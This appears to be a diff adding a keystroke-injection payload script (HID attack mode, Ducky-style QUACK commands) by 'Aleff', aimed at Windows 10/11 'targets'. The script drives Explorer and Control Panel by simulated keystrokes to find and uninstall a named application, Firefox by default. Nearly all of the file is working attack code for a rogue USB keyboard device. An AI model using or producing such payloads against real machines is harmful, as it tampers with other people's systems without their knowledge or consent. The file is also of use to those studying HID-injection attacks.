@@ -1,0 +1,77 @@
+##############################################################################
+#                                                                            #
+# Title        : Uninstall A Specific App On Windows Through Control Panel   #
+# Author       : Aleff                                                       #
+# Version      : 1.0                                                         #
+# Category     : Execute                                                     #
+# Target       : Windows 10/11                                               #
+#                                                                            #
+##############################################################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+# - The application you want to uninstall must be installed on the target (?obvious right? ^^)
+
+# NOTE
+# - Payload tested on Windows 11 Eng
+
+# VARIABLES
+# Set the exact name of the application as it appears within the control panel. Do not assume that just because an application is known by a certain name then it will have exactly that name, e.g. `Firefox` shows up again as `Mozilla Firefox (x64 en)`
+APP_NAME='Firefox'
+
+# Open Windows research
+QUACK DELAY 2000
+QUACK GUI
+QUACK DELAY 1000
+
+# Search and opern explorer app
+QUACK STRING explorer
+QUACK ENTER
+QUACK DELAY 1000
+
+# Goto search bar and open 'Uninstall or change a program' page
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Control Panel\Programs\Programs and Features
+QUACK ENTER
+QUACK DELAY 1500
+
+# Goto search bar and search the app
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK STRING $APP_NAME
+QUACK DELAY 500
+
+# Select the app and click on it
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK SPACE
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 2000
+QUACK ALT F4
